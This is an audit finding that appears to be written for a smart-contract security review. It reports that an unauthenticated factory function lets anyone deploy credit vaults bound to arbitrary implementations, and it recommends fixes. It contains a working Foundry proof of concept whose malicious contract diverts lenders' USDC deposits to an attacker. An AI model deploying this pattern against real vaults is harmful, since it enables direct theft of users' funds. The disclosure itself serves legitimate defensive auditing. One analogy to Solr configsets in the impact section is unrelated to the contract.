### Title

Unauthenticated factory deployments can bind credit-vault proxies to arbitrary malicious implementations - (File: contracts/IdleCreditVaultFactory.sol)

### Summary

`IdleCreditVaultFactory.deployCreditVault` is callable by any EOA and accepts caller-supplied CDO and strategy implementation addresses without an allowlist or privileged-role check. The attacker can therefore make the canonical factory deploy and initialize a proxy running attacker-controlled code, while the deployment event and treasury ownership make it appear to be a normally administered credit vault. [1](#0-0) [2](#0-1) 

### Finding Description

The deployment function only checks the fee floor and nonzero manager; it does not authenticate `msg.sender` and does not constrain `cvParams.implementation` or `strategyData.implementation` to audited implementation contracts. [3](#0-2) 

`_deployBaseCreditVault` passes both caller-controlled implementation addresses directly into `_deployProxy` and immediately delegatecalls the corresponding initializers. [4](#0-3) 

The factory then configures the vault and emits `CreditVaultDeployed`, including the proxy addresses and the programmable-borrower/ancillary metadata consumers use to identify factory-created vaults. [5](#0-4) 

A malicious CDO implementation only needs to implement the initializer selector and absorb the subsequent configuration calls. Once a lender calls `depositAA`, the implementation can transfer the approved underlying directly to the attacker instead of following the normal `_deposit` accounting path used by `IdleCDOCreditVault`. [6](#0-5) 

### Impact Explanation

A user who relies on the factory deployment provenance and deposits 1,000,000 USDC loses the entire approved deposit. This is direct theft by an unprivileged EOA and does not require compromise of the treasury, manager, guardian, borrower, Keyring admin, fee receiver, or queue.

The violated trust invariant is that factory-deployed proxies are bound to authenticated protocol implementations. Like untrusted Solr configsets reaching privileged library loading, an unauthenticated caller-controlled implementation reaches the factory’s deployment and initialization path.

### Likelihood Explanation

Deployment requires only one public transaction and knowledge of the parameter structs. The exploit then requires a lender or integration to deposit into the malicious vault address; such an address can plausibly be discovered through the canonical `CreditVaultDeployed` event and shows treasury as the nominal owner after deployment. [7](#0-6) 

The likelihood is therefore lower than an attack on existing pooled funds, but the setup cost and required privileges are minimal.

### Recommendation

Prevent arbitrary implementation binding in production deployments:

- Make `deployCreditVault` and `deployRevolvingCreditVault` callable only by `treasury`, or maintain a treasury-controlled implementation allowlist.
- Prefer storing audited implementation addresses in the factory rather than accepting code addresses from calldata.
- Validate strategy, CDO, borrower adapter, queue, and escrow implementations against immutable or registry-approved template IDs.
- Include the resolved implementation addresses and template IDs in deployment events so consumers can verify that a vault used an approved implementation.

### Proof of Concept

The following Foundry test demonstrates an unprivileged deployer binding a canonical factory deployment to malicious CDO code and stealing a lender’s approved USDC deposit.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCreditVaultFactory} from "../contracts/IdleCreditVaultFactory.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";

contract MaliciousCDOImplementation {
    address public immutable attacker;
    address public token;
    address public strategy;
    address private ownerAddress;

    constructor(address _attacker) {
        attacker = _attacker;
    }

    // Same selector as IdleCDOCreditVault.initialize.
    function initialize(
        uint256,
        address _guardedToken,
        address,
        address _owner,
        address,
        address _strategy,
        uint256
    ) external {
        token = _guardedToken;
        strategy = _strategy;
        ownerAddress = _owner;
    }

    function owner() external view returns (address) {
        return ownerAddress;
    }

    function transferOwnership(address newOwner) external {
        ownerAddress = newOwner;
    }

    // Silently accepts all factory configuration calls that are not explicitly implemented.
    fallback() external payable {}
    receive() external payable {}

    function depositAA(uint256 amount) external returns (uint256) {
        bytes memory result;
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(
                IERC20Detailed.transferFrom.selector,
                msg.sender,
                attacker,
                amount
            )
        );
        result = ret;
        require(ok && (result.length == 0 || abi.decode(result, (bool))), "steal failed");
        return amount;
    }
}

contract FactoryUntrustedImplementationPoC is Test {
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IdleCreditVaultFactory factory;
    MaliciousCDOImplementation maliciousCdoImplementation;
    IdleCreditVault strategyImplementation;

    address attacker = makeAddr("attacker");
    address treasury = makeAddr("honestTreasury");
    address proxyAdmin = makeAddr("proxyAdmin");
    address honestManager = makeAddr("honestManager");
    address honestBorrower = makeAddr("honestBorrower");
    address honestFeeReceiver = makeAddr("honestFeeReceiver");
    address lender = makeAddr("kycLender");

    bytes32 constant DEPLOYED_EVENT =
        keccak256("CreditVaultDeployed(address,address,address,address,address,address)");

    function setUp() public {
        vm.createSelectFork("mainnet", 20_000_000);

        factory = new IdleCreditVaultFactory();
        factory.initialize(treasury, proxyAdmin);

        strategyImplementation = new IdleCreditVault();
        maliciousCdoImplementation = new MaliciousCDOImplementation(attacker);
    }

    function testPermissionlessFactoryDeploysMaliciousImplementation() public {
        IdleCreditVaultFactory.CreditVaultParams memory cvParams =
            IdleCreditVaultFactory.CreditVaultParams({
                implementation: address(maliciousCdoImplementation),
                limit: 0,
                underlying: USDC,
                apr: 0,
                epochDuration: 30 days,
                bufferPeriod: 1 days,
                instantWithdrawDelay: 1 days,
                instantWithdrawAprDelta: 0,
                disableInstantWithdraw: true,
                keyringPolicy: 0,
                feeReceiver: honestFeeReceiver,
                fees: 5_000,
                managementFee: 500,
                isInterestMinted: false,
                isDepositDuringEpochDisabled: true
            });

        IdleCreditVaultFactory.StrategyData memory strategyData =
            IdleCreditVaultFactory.StrategyData({
                implementation: address(strategyImplementation),
                manager: honestManager,
                borrower: honestBorrower,
                borrowerName: "HonestBorrower"
            });

        IdleCreditVaultFactory.AncillaryParams memory ancillary =
            IdleCreditVaultFactory.AncillaryParams({
                keyring: address(0),
                queueImplementation: address(0),
                prefundedDepositWindow: 0,
                writeOffImplementation: address(0)
            });

        vm.recordLogs();
        vm.prank(attacker);
        factory.deployCreditVault(cvParams, strategyData, ancillary);

        address deployedVault;
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].topics[0] == DEPLOYED_EVENT) {
                (deployedVault,,,,,) = abi.decode(
                    logs[i].data,
                    (address, address, address, address, address, address)
                );
            }
        }
        assertTrue(deployedVault != address(0), "vault was not deployed");

        uint256 depositAmount = 1_000_000e6;
        deal(USDC, lender, depositAmount);

        vm.startPrank(lender);
        IERC20Detailed(USDC).approve(deployedVault, depositAmount);
        MaliciousCDOImplementation(deployedVault).depositAA(depositAmount);
        vm.stopPrank();

        assertEq(IERC20Detailed(USDC).balanceOf(attacker), depositAmount);
        assertEq(IERC20Detailed(USDC).balanceOf(lender), 0);
    }
}
```

    CreditVaultParams memory cvParams,

    AncillaryParams memory ancillaryParams

    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;

      _deployBaseCreditVault(strategyData, cvParams);

    address keyringWhitelist = _deployKeyring(ancillaryParams);

    IdleCDOEpochQueue queue = _deployQueue(ancillaryParams, cv, keyringWhitelist);
    IdleCreditVaultWriteOffEscrow writeOffEscrow =
      _deployWriteOffEscrow(ancillaryParams.writeOffImplementation, cv, treasury);

    _finalizeKeyringAdmin(keyringWhitelist, manager);
    // Transfer ownership of strategy and credit vault to treasury
    strategy.transferOwnership(treasury);
    cv.transferOwnership(treasury);

    emit CreditVaultDeployed(
      address(cv),
      address(strategy),
      address(queue),
      address(0),
      keyringWhitelist,
      address(writeOffEscrow)
    );

  function _deposit(uint256 _amount, address _tranche) internal virtual whenNotPaused returns (uint256 _minted) {
    if (_amount == 0) {
      return _minted;
    }
    // check that we are not depositing more than the contract available limit
    _guarded(_amount);
    // interest accrued since last depositXX/withdrawXX is splitted between AA and BB
    // according to trancheAPRSplitRatio. NAVs of AA and BB are updated and tranche
    // prices adjusted accordingly
    _updateAccounting();
    // get underlyings from sender
    address _token = token;
    uint256 _preBal = _contractTokenBalance(_token);
    _transferUnderlyingsFrom(msg.sender, address(this), _amount);
    // mint tranche tokens according to the current tranche price
    _minted = _mintSharesAtCurrPrice(_contractTokenBalance(_token) - _preBal, msg.sender, _tranche);
    // update trancheAPRSplitRatio
    _updateSplitRatio(_getAARatio(true));

    // direct deposit in the strategy
    IIdleCDOStrategy(strategy).deposit(_amount);
  }
